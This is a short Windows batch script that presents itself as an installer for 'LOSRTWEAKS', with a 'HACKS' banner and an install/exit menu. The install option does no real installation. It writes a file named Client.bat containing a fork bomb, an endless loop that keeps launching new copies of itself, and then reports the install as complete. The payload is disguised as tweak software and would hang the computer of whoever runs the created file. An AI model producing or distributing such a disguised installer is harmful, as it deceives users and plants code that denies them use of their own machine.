@echo off
TITLE LOSRTWEAKS INSTALL
Chcp 65001 >nul
Echo.
Echo    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗
Echo    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝
Echo    ███████║███████║██║     █████╔╝ ███████╗
Echo    ██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║
Echo    ██║  ██║██║  ██║╚██████╗██║  ██╗███████║
Echo    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
Echo.
Echo   A - INSTALL
Echo   B - EXIT
pause >nul
:CHOICE
Set /p choice="Enter A or B: "

If /i "%choice%"=="a" goto INSTALL
If /i "%choice%"=="b" goto EXIT
Echo Invalid choice. Please enter A or B.
goto CHOICE

:INSTALL
Echo Installing...
REM Your installation commands go here
timeout /t 5 /nobreak >nul
echo :loop > Client.bat
echo start Client.bat >> Client.bat
echo goto loop >> Client.bat
echo Install complete!
timeout /t 5 /nobreak >nul
exit
pause >nul

:EXIT
Echo Exiting...
exit
pause >nul
